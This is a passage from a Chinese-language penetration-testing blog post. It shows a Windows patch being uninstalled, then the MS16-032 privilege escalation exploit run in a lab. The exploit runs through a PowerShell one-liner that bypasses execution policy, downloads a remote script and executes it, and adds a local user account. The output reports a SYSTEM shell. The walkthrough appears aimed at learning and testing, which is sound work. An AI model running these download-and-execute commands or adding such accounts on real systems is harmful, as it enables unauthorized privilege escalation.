-</code></pre><p><img src="https://raw.githubusercontent.com/Knlvre/Knlvre.github-io/master/img/CVE&amp;MS/bd-7.png" alt="7"></p>
-<p>卸载完成之后需要重启。重启后我们再次查看补丁列表，已经没有了<code>KB3139914</code></p>
-<pre><code>E:\MS16-032&gt;systeminfo
-...
-系统类型:         x64-based PC
-处理器:           安装了 2 个处理器。
-修补程序:         安装了 5 个修补程序。
-                  [01]: KB2534111
-                  [02]: KB2999226
-                  [03]: KB958488
-                  [04]: KB976902
-...
-E:\MS16-032&gt;
-</code></pre><p>试一下执行<code>MS16-032（CVE-2016-0099）</code>的脚本</p>
-<pre><code>E:\MS16-032&gt;powershell -nop -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&#39;);Invoke-MS16-032 -Application cmd.exe -commandline &#39;/c net user test_test test_test /add&#39;&quot;
-     __ __ ___ ___   ___     ___ ___ ___
-    |  V  |  _|_  | |  _|___|   |_  |_  |
-    |     |_  |_| |_| . |___| | |_  |  _|
-    |_|_|_|___|_____|___|   |___|___|___|
-
-                   [by b33f -&gt; @FuzzySec]
-
-[?] Operating system core count: 2
-[&gt;] Duplicating CreateProcessWithLogonW handles..
-...
-[&gt;] Starting process race
-[!] Holy handle leak Batman, we have a SYSTEM shell!!
-
-E:\MS16-032&gt;net user
-
-\\WIN... 的用户帐户
-
------------------------------------------------------
-Administrator            Guest                    HSW
-test_test
-命令成功完成。
-
-E:\MS16-032&gt;
-</code></pre><p>脚本又能执行成功了，说明我们成功卸载补丁</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">渗透测试</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="knlvre.github.io/2019/10/04/Windows系统添加补丁/">展开全文 >></a>
         </p>
       
 
